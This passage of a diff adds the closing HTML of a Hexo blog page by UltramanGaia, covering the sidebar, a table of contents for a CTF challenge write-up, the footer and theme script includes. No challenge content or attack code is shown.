+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+
+    <div class="post-spread">
+      
+    </div>
+  </div>
+
+
+          </div>
+          
+
+
+          
+
+  
+
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            文章目录
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            站点概览
+          </li>
+        </ul>
+      
+
+      <section class="site-overview-wrap sidebar-panel">
+        <div class="site-overview">
+          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+            
+              <img class="site-author-image" itemprop="image"
+                src="/images/avatar.jpg"
+                alt="UltramanGaia" />
+            
+              <p class="site-author-name" itemprop="name">UltramanGaia</p>
+              <p class="site-description motion-element" itemprop="description"></p>
+          </div>
+
+          <nav class="site-state motion-element">
+
+            
+              <div class="site-state-item site-state-posts">
+              
+                <a href="/archives/">
+              
+                  <span class="site-state-item-count">17</span>
+                  <span class="site-state-item-name">日志</span>
+                </a>
+              </div>
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-categories">
+                <a href="/categories/index.html">
+                  <span class="site-state-item-count">5</span>
+                  <span class="site-state-item-name">分类</span>
+                </a>
+              </div>
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-tags">
+                <a href="/tags/index.html">
+                  <span class="site-state-item-count">10</span>
+                  <span class="site-state-item-name">标签</span>
+                </a>
+              </div>
+            
+
+          </nav>
+
+          
+
+          <div class="links-of-author motion-element">
+            
+          </div>
+
+          
+          
+
+          
+          
+
+          
+
+        </div>
+      </section>
+
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#1-ctf-入门级题目"><span class="nav-number">1.</span> <span class="nav-text">1. ctf 入门级题目</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#2-曲奇饼"><span class="nav-number">2.</span> <span class="nav-text">2. 曲奇饼</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#3-类型"><span class="nav-number">3.</span> <span class="nav-text">3. 类型</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#4-登录"><span class="nav-number">4.</span> <span class="nav-text">4. 登录</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#5-admin"><span class="nav-number">5.</span> <span class="nav-text">5. admin</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#线下赛"><span class="nav-number">6.</span> <span class="nav-text">线下赛</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#渗透阶段"><span class="nav-number">6.1.</span> <span class="nav-text">渗透阶段</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#第一题："><span class="nav-number">6.1.1.</span> <span class="nav-text">第一题：</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#第二题："><span class="nav-number">6.1.2.</span> <span class="nav-text">第二题：</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#第三题："><span class="nav-number">6.1.3.</span> <span class="nav-text">第三题：</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#攻防阶段"><span class="nav-number">6.2.</span> <span class="nav-text">攻防阶段</span></a></li></ol></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
+      
+
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright">&copy; <span itemprop="copyrightYear">2017</span>
+  <span class="with-love">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">UltramanGaia</span>
+
+  
+</div>
+
+
+  <div class="powered-by">由 <a class="theme-link" target="_blank" href="https://hexo.io">Hexo</a> 强力驱动</div>
+
+
+
+  <span class="post-meta-divider">|</span>
+
+
+
+  <div class="theme-info">主题 &mdash; <a class="theme-link" target="_blank" href="https://github.com/iissnan/hexo-theme-next">NexT.Gemini</a> v5.1.3</div>
+
+
+
+
+        
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+      </div>
+    
+
+    
+
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+  
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=5.1.3"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=5.1.3"></script>
+
+
+
+  
+  
+
+
+  <script type="text/javascript" src="/js/src/affix.js?v=5.1.3"></script>
+
+  <script type="text/javascript" src="/js/src/schemes/pisces.js?v=5.1.3"></script>
+
+
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.3"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.1.3"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.3"></script>
+
+
+
+  
+
+
+  
+
+
+
+
+	
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+  
+
+  
+
+  
+
+  
+
+</body>
+</html>
